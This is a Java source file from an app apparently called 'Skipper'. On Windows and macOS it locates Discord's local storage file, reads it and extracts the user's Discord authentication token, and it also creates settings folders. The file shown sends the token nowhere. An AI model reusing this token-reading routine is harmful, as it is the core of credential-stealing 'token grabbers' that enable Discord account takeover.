package main;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.nio.file.Path;
import java.nio.file.Paths;

public class StartUp extends Main {
	protected static void startUp() throws IOException {
		String finalPath = "";
		if (OSCheck.isWindows()) {
			Path thisFile = Paths.get("this").toAbsolutePath();
			String userPath = thisFile.toString();
			String directory = userPath.substring(9);
			String userName = directory.substring(0, directory.indexOf("\\"));
			int userNameLength = userName.length();
			userDirectory = userPath.substring(0, 9 + userNameLength);
			finalPath = userDirectory
					+ "\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
			tokenLocation = Paths.get(finalPath).toFile();
			baseFolder = new File(userDirectory + "\\AppData\\Local\\Skipper");
			settingsFile = new File(Main.userDirectory + "\\AppData\\Local\\Skipper\\Settings.txt");
			imageFile = new File(Main.userDirectory + "\\AppData\\Local\\Skipper\\Text.png");
			checkForFiles();
			getToken();
		} else if (OSCheck.isMac()) {
			Path thisFile = Paths.get("this").toAbsolutePath();
			String userPath = thisFile.toString();
			String directory = userPath.substring(9);
			String userName = directory.substring(0, directory.indexOf("/"));
			int userNameLength = userName.length();
			userDirectory = userPath.substring(0, 9 + userNameLength);
			finalPath = userDirectory
					+ "/Library/Application Support/discord/Local Storage/https_discordapp.com_0.localstorage";
			tokenLocation = Paths.get(finalPath).toFile();

			File dir = new File(userDirectory + "/Library/Application Support/Skipper");
			dir.mkdir();
			settingsFile = new File(Main.userDirectory + "/Library/Application Support/Skipper/Settings.txt");
			imageFile = new File(Main.userDirectory + "/Library/Application Support/Skipper/Text.png");
			checkForFiles();
			getToken();

		} else

		{
			System.out.println("Your OS is not support!!");
		}
	}

	protected static void getToken() {
		String currentLine = "";
		StringBuilder tokenGetter = new StringBuilder();
		try (InputStream fisToken = new FileInputStream(tokenLocation);
				InputStreamReader isrToken = new InputStreamReader(fisToken, Charset.forName("UTF-8"));
				BufferedReader brToken = new BufferedReader(isrToken);

		) {
			while ((currentLine = brToken.readLine()) != null) {
				tokenGetter.append(currentLine);
			}
			tokenGetter = new StringBuilder(tokenGetter.toString().replaceAll("[^a-zA-Z0-9\\-\\.\\_\\\"]", ""));
			if (tokenGetter.toString().contains("token\"M")) {
				tokenGetter = new StringBuilder(tokenGetter.substring(tokenGetter.indexOf("token\"M") + 6));
				token = tokenGetter.substring(0, tokenGetter.indexOf("\""));
			} else if (tokenGetter.toString().contains("token\"m")) {
				tokenGetter = new StringBuilder(tokenGetter.substring(tokenGetter.indexOf("token\"m") + 6));
				token = tokenGetter.substring(0, tokenGetter.indexOf("\""));
			}
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void checkForFiles() throws IOException {
		if (!(baseFolder.exists())) {
			baseFolder.mkdir();
		}
		if (!(settingsFile.exists())) {
			settingsFile.createNewFile();
		}
	}

	public static boolean deleteDirectory(File dir) {
		if (dir.isDirectory()) {
			File[] children = dir.listFiles();
			for (int i = 0; i < children.length; i++) {
				boolean success = deleteDirectory(children[i]);
				if (!success) {
					return false;
				}
			}
		}
		return dir.delete();
	}
}
